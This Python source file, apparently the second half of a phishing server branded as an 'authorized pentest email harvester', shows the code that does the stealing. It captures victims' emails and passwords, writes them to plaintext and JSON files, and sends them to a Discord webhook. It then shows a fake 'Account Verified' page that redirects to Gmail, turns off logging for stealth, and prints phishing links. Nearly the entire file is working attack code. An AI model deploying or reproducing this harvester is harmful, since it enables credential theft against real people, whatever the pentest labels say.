    def capture_and_exfil(self):
        """Real-time credential extraction"""
        content_length = int(self.headers.get('Content-Length', 0))
        raw_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(raw_data)
            
            # VALIDATE & STRUCTURE CREDS
            if data.get('email', '').count('@') == 1 and len(data.get('password', '')) > 3:
                creds = {
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'email': data['email'],
                    'password': data['password'],
                    'ip_address': data['ip'],
                    'user_agent': data['userAgent'][:120] + '...' if len(data['userAgent']) > 120 else data['userAgent'],
                    'fingerprint': data.get('canvasFP', 'N/A'),
                    'source': 'pentest_email_harvester'
                }
                
                # MULTI-FORMAT STORAGE
                self.save_all_formats(creds)
                
                # INSTANT NOTIFICATIONS
                threading.Thread(target=self.notify_attackers, args=(creds,)).start()
                
                print(f"""
🟢 PEN TEST HIT! [{creds['timestamp']}]
📧 EMAIL: {creds['email']}
🔑 PASS:  {creds['password']}
🌐 IP:    {creds['ip_address']}
👤 UA:    {creds['user_agent']}
📁 FILE:  {CREDS_DIR}/creds.txt
                """)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success', 'redirect': '/success'}).encode())
            
        except Exception as e:
            self.send_error(500, str(e))
    
    def save_all_formats(self, creds):
        """Save in multiple formats for pentest reporting"""
        os.makedirs(CREDS_DIR, exist_ok=True)
        
        # 1. Master plaintext (Burp/Password manager format)
        with open(f'{CREDS_DIR}/creds.txt', 'a') as f:
            f.write(f"{creds['email']}:{creds['password']} | {creds['ip_address']} | {creds['timestamp']}\\n")
        
        # 2. JSON for automation
        filename = creds['email'].replace('@', '_').replace('.', '_') + f"_{int(datetime.now().timestamp())}"
        with open(f'{CREDS_DIR}/{filename}.json', 'w') as f:
            json.dump(creds, f, indent=2)
        
        # 3. Live dashboard
        self.captured_sessions.append(creds)
        with open(f'{CREDS_DIR}/live_dashboard.json', 'w') as f:
            json.dump(self.captured_sessions[-10:], f, indent=2)  # Last 10
    
    def notify_attackers(self, creds):
        """Multi-channel pentest notifications"""
        if self.discord_webhook:
            self.discord_notification(creds)
        
        # Live terminal dashboard update
        os.system('clear' if os.name == 'posix' else 'cls')
        print("🎯 PEN TEST LIVE DASHBOARD")
        print("=" * 60)
        print(f"Captured: {len(self.captured_sessions)} sessions")
        print(f"Latest: {creds['email']} @ {creds['timestamp']}")
    
    def discord_notification(self, creds):
        """Discord webhook for pentest team"""
        try:
            embed = {
                "title": "🟢 PEN TEST - Email Credentials Captured",
                "description": f"**{creds['email']}**",
                "color": 5763719,
                "fields": [
                    {"name": "🔑 Password", "value": f"`{creds['password']}`", "inline": True},
                    {"name": "🌐 IP Address", "value": f"`{creds['ip_address']}`", "inline": True},
                    {"name": "📱 User Agent", "value": creds['user_agent'], "inline": False}
                ],
                "footer": {"text": f"Pentest Harvester | {creds['timestamp']}"},
                "timestamp": creds['timestamp'].replace(' ', 'T')
            }
            requests.post(self.discord_webhook, json={"embeds": [embed]}, timeout=3)
        except:
            pass
    
    def live_dashboard(self):
        """Real-time pentest dashboard"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        html = f"""
        <!DOCTYPE html><html><head><title>Pentest Dashboard</title>
        <style>body{{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:40px}}table{{width:100%;border-collapse:collapse}}th,td{{padding:12px;border-bottom:1px solid #333;text-align:left}}th{{background:#333}}</style>
        </head><body>
        <h1>🎯 LIVE PEN TEST DASHBOARD</h1>
        <p>Total Captured: {len(self.captured_sessions)}</p>
        <table>
        <tr><th>Email</th><th>Password</th><th>IP</th><th>Time</th></tr>
        """
        for cred in self.captured_sessions[-10:]:
            html += f"<tr><td>{cred['email']}</td><td>{cred['password']}</td><td>{cred['ip_address']}</td><td>{cred['timestamp']}</td></tr>"
        html += "</table><p><a href='/'>New phishing page</a></p></body></html>"
        self.wfile.write(html.encode())
    
    def success_page(self):
        """Post-capture success page"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
<!DOCTYPE html><html><head><title>Success</title><meta http-equiv="refresh" content="3;url=https://mail.google.com"></head>
<body style="font-family:sans-serif;text-align:center;padding:60px;background:#f0f8ff;">
<h1 style="color:#28a745;">✅ Account Verified Successfully</h1>
<p>Redirecting to your email inbox...</p>
<p>If not redirected, <a href="https://mail.google.com">click here</a></p>
</body></html>
        """)
    
    def error_404(self):
        self.send_response(404)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Stealth mode

def setup_https():
    """Generate production SSL certificates"""
    if not all(os.path.exists(f) for f in ['server.crt', 'server.key']):
        print("🔐 Generating HTTPS certificates...")
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:4096', '-keyout', 'server.key',
            '-out', 'server.crt', '-days', '365', '-nodes',
            '-subj', '/C=US/ST=CA/L=SF/O=Pentest/CN=mail-security.net'
        ], check=True)
    return 'server.crt', 'server.key'

def main():
    parser = argparse.ArgumentParser(description='Authorized Pentest Email Harvester')
    parser.add_argument('--webhook', help='Discord webhook URL for real-time alerts')
    parser.add_argument('--port', type=int, default=PORT)
    args = parser.parse_args()
    
    # Setup
    os.makedirs(CREDS_DIR, exist_ok=True)
    cert_file, key_file = setup_https()
    
    discord_webhook = args.webhook
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║           🎯 AUTHORIZED PENETRATION TEST TOOL               ║
║                    EMAIL HARVESTER v4.0                     ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    server_class = lambda *args, **kwargs: PentestEmailHarvester(
        *args, discord_webhook=discord_webhook, **kwargs
    )
    
    with socketserver.TCPServer(("", args.port), server_class) as httpd:
        if HTTPS:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_file, key_file)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            protocol = "HTTPS"
            test_url = f'https://localhost:{args.port}'
        else:
            protocol = "HTTP"
            test_url = f'http://localhost:{args.port}'
        
        phishing_urls = [
            f"{protocol}://YOUR_PUBLIC_IP:{args.port}/",
            f"{protocol}://YOUR_PUBLIC_IP:{args.port}/login",
            f"https://tinyurl.com/PENTEST-LOGIN"  # Generate real one
        ]
        
        print(f"🚀 SERVER LIVE ON {protocol} PORT {args.port}")
        print(f"📱 PHISHING LINKS:")
        for url in phishing_urls:
            print(f"   🔗 {url}")
        print(f"💾 CREDS FOLDER: ./{CREDS_DIR}/")
        print(f"📊 DASHBOARD:   {test_url}/dashboard")
        print(f"🔔 DISCORD:     {discord_webhook[:50]}..." if discord_webhook else "🔔 No Discord")
        print("\n🎯 Waiting for pentest targets...\n")
        
        webbrowser.open(test_url)
        httpd.serve_forever()

if __name__ == '__main__':
    main()
